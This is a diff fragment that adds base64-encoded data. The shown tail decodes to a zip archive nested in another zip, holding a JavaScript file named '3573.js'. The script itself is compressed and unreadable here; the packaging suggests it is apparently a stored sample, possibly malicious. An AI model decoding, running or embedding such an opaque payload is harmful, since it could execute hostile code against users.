+PAXb3MbDMVeonh/I42IfQ+856OVncoTeGQ8mzio4tHkRdtWz/kzWyd0+wizkH5jz2EL6yEZAJeff
+aneWmBHSxRHSCcpHlBzdM9zMuFjkURDIYTyxQLEz9CBl0nJaswOB7meS+Rew/NWr4fGOZNrayXho
+44VLaxTIdkP3njI0CZrkONI72OEREMPpx0dNlEu7UF0Lg441NUNk9tvrbvSd6G+U1U86qQlOnG/g
+Of4opSGBa/yxioxEwP9WINKNo2hH+IcIaN5BMR6ut4LmDcUfxAvvMXG9G+LF+kew/wrC9z9FFesb
+gT9gUFGwvudB+Q3RLvipYEkygLPLmYMqGZQVfMmEg/AdlF/E2FcBKhvV5J38pYbwHZQ/3HUUNO+G
+yIP9oKjiegdFjvAdAdg5FuBrUHyICfUkIwJzEF0F4dvB9e78D4QAbXs/AjQnCYVLPlQRvlvQvIbw
+vXyncPQizD8WhjJQYqbNOgIG8LovqhjH/96LMOegHBM3GhTCUQNX+JGrHNU8KLZkxBoXJxxMGcWA
+7k9iIoYrhIlAjlhfAIhrH/oyATpzGfcRqiR26BKuAUVZ5HrQRCzVimVukMKcrv+DuQmKGrR5q9FC
+7NAI0OJR5hkBUFyeXYQ5aZ9LmAJlRM4/AY/jAc9rGhOU43FWxdjXPwvR7ssYcoh9OhGrvEZAnpQ4
+2gPvtIOPHpRVpHQdH11BRY8JpQZjE5ntAK1FwEcPyhwpnca5WnTrDjo8Uv51Gx1H/fs/AFBLAQI/
+ABQAAAAIACpcREuCe/acExsAAH22AAAHACQAAAAAAAAAIAAAAAAAAAAzNTczLmpzCgAgAAAAAAAB
+ABgAjCxQQD890wGMLFBAPz3TARq5G0A/PdMBUEsFBgAAAAABAAEAWQAAADgbAAAAAFBLAQI/AAoA
+AAAAACpcREuhwRhJpxsAAKcbAAAIACQAAAAAAAAAIAAAAAAAAAAzNTczLnppcAoAIAAAAAAAAQAY
+AGjxVEA/PdMBII9SQD890wH9HB5APz3TAVBLBQYAAAAAAQABAFoAAADNGwAAAAA=
